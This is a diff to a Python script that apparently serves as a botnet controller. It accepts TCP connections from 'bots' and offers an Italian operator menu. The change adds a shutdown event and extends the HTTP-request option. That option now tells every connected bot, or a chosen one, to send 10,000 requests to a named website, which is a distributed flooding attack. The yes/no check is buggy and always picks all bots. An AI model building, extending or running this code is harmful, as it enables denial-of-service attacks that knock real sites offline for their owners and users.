@@ -1,5 +1,6 @@
 import concurrent
 import socket
+from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
 
 import requests
@@ -8,7 +9,7 @@ server_address = ('localhost', 15200)
 clients = []
 
 
-def initialize():
+def initialize(e):
     """
     Initialize the server and listen for incoming connections.
     The server will listen on the port specified in server_address and
@@ -17,13 +18,17 @@ def initialize():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((server_address[0], server_address[1]))
     s.listen(5)
+    s.settimeout(2)
     print(f'Server is listening on port {server_address[1]}')
-    while True:
-        client, address = s.accept()
-        clients.append((client, address))
-        print(f'Client connected: {address}')
-        data = client.recv(1024)
-        print(data.decode('utf-8'))
+    while not e.is_set():
+        try:
+            client, address = s.accept()
+            clients.append((client, address))
+            print(f'Client connected: {address}')
+            data = client.recv(1024)
+            print(data.decode('utf-8'))
+        except socket.timeout:
+            continue
 
 
 def start_server():
@@ -31,21 +36,22 @@ def start_server():
     Start a thread for the server and a thread to handle console input.
     It will wait for both threads to finish before exiting the program.
     """
+    event = Event()
     with ThreadPoolExecutor(max_workers=2) as executor:
-        x = executor.submit(initialize)
-        y = executor.submit(handle_console)
+        x = executor.submit(initialize, event)
+        y = executor.submit(handle_console, event)
 
         # Check if both threads are done
-        concurrent.futures.wait([x, y], return_when=concurrent.futures.ALL_COMPLETED)
+        concurrent.futures.wait([x, y], return_when=concurrent.futures.FIRST_COMPLETED)
 
-        executor.shutdown(wait=True)
+        executor.shutdown(wait=False)
 
 
-def handle_console():
+def handle_console(e):
     """
     Handle console input from the user.
     """
-    while True:
+    while not e.is_set():
         print("1. Mostra tutti i client connessi")
         print("2. Invia messaggio a tutti i client")
         print("3. Invia messaggio a un client specifico")
@@ -63,8 +69,9 @@ def handle_console():
             case 4:
                 send_http_request()
             case 0:
-                # TODO: close the server
                 print("Exiting...")
+                e.set()
+                return
             case _:
                 print("Scelta non valida")
 
@@ -120,22 +127,27 @@ def send_http_request():
     Send an HTTP request to the specified URL
     """
 
-    if len(clients) == 0:
-        print("Nessun client connesso")
-        return
-
-    # client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
-    # if client_address not in [client[1][1] for client in clients]:
-    #     print("Client non trovato")
-    #     return
-
     url = 'https://marcorealacci.me'
     myobj = {
         'url': url,
         'number_of_requests': 10000
     }
 
-    requests.post("http://127.0.0.1:80", json=myobj)
+    if len(clients) == 0:
+        print("Nessun client connesso")
+        return
+
+    if input("Voi utilizzare tutti i bot connessi? S/N: ") == "S" or "s":
+        for client in clients:
+            requests.post(f"http://{client[1][0]}:80", json=myobj)
+    else:
+        client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
+        if client_address not in [client[1][1] for client in clients]:
+            print("Client non trovato")
+            return
+        else:
+            client = [client for client in clients if client[1][1] == client_address][0][1][0]
+            requests.post(f"http://{client}:80", json=myobj)
 
 
 if __name__ == '__main__':
